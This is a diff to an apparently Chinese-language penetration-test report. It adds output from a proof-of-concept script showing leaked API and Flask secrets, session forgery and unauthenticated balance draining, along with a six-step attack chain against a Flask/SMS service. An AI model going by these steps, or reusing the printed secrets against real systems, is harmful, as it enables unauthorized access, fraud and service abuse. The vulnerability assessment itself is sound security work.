@@ -175,14 +175,28 @@ Secret 会进入 access log、Referer、代理日志。
 
 ---
 
-## 攻击链示例
+## 攻击链示例（已实机跑通）
+
+运行 `python3 tools/exploit_poc.py` 全部 `[OK]`：
+
+```
+[OK] 泄露 api_secret = b9887333ae4c43858c9235e0ac4e0921
+[OK] debugger 泄露 Flask SECRET = pohZc8RrQkczwHyYZUbX
+[OK] debugger 泄露部署路径 app.py
+[OK] debugger 泄露 DB 表 accounts.balance
+[OK] 开放注册成功
+[OK] 用户枚举成功
+[OK] 未鉴权 decrease-balance 已接受请求（无鉴权）
+[OK] 8081 下单成功
+[OK] Flask session 伪造成功
+```
 
 ```
 1. GET /api/desktop/settings?key=api_secret     → 拿到 SMS secret
 2. POST /api/desktop/decrease-balance + NaN     → 拿到 Flask SECRET + app.py 路径
-3. 伪造 session / 破解 debugger PIN             → 管理后台 / RCE
+3. 伪造 session / 破解 debugger PIN             → 管理后台 / RCE（PIN 未破，但 SECRET 已泄露）
 4. POST /admin/delete-cards（需有效 admin session）→ 破坏卡密
-5. 未鉴权 decrease-balance                       → 耗尽用户余额
+5. 未鉴权 decrease-balance                       → 耗尽用户余额（有余额即可扣）
 6. 8081 create + query                           → 滥用 SMS 查询服务
 ```
 
